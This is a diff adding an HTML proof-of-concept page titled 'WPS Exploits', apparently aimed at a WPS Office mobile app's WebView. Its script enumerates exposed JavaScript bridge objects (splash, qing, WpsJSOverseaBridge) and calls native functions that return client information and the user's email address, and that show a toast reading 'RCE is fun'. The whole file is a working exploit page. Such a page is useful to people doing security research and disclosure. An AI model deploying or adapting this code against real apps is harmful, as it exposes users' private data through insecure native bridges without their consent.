@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+WPS Exploits <br><br>
+<body>
+
+    <script type="text/javascript">
+        var string = "";
+
+        function findAllVariables() {
+            for (let variable in window) {
+                if (window.hasOwnProperty(variable)) {
+
+                    var ul = document.getElementById("list");
+                    var li = document.createElement("li");
+                    li.appendChild(document.createTextNode(variable));
+                    ul.appendChild(li);
+                }
+            }
+            // = string;
+        }
+
+        function getMethodsNames(obj) {
+            return Object.keys(obj)
+                .filter((key) => typeof obj[key] === 'function');
+        }
+
+        // Get the Object's methods (functions):
+        function getMethods(obj) {
+            return Object.keys(obj)
+                .filter((key) => typeof obj[key] === 'function')
+                .map((key) => obj[key]);
+        }
+
+
+        function getObj(obj) {
+            try {
+                document.getElementById("myP").innerHTML = getMethodsNames(obj);
+            } catch (error) {
+                document.getElementById("myP").innerHTML = error;
+            }
+        }
+
+        function call() {
+            try {
+                document.getElementById("myP").innerHTML = splash.JSGetClientInfo();
+            } catch (error) {
+                document.getElementById("myP").innerHTML = error;
+            }
+        }
+
+        function showToastJS() {
+            try {
+                //qing.JSShowToast("test 1");
+                //splash.JSShowToast("test 2");
+                WpsJSOverseaBridge.JSShowToast("Hey I just showed a custom toast that is coded in Java in your app!! RCE is fun");
+                //string.JSShowToast("test 4");
+            } catch (error) {
+                document.getElementById("myP").innerHTML = error;
+            }
+        }
+
+
+        function getUserMail() {
+            try {
+                document.getElementById("myP").innerHTML = splash.jsGetUserMail();
+            } catch (error) {
+                document.getElementById("myP").innerHTML = error;
+            }
+        }
+    </script>
+
+    <button onclick="findAllVariables()"> 
+        List all values in the DOM 
+    </button>
+
+    <button onclick="getObj(qing)"> 
+        Get Qing
+    </button>
+
+    <button onclick="getObj(splash)"> 
+        Get Splah
+    </button>
+
+    <button onclick="getObj(WpsJSOverseaBridge)"> 
+        Get Wps
+    </button>
+
+    <button onclick="call()"> 
+        Call JSGetClientInfo() - Native Function
+    </button>
+
+    <button onclick="showToastJS()"> 
+        Call showToast() - Native Function
+    </button>
+
+    <button onclick="getUserMail()">
+        Call Get User Mail - Native Function
+    </button>
+
+    <p id="myP">
+
+    </p>
+    <ul id="list">
+        <ul>
+
+
+</body>
+
+</html>
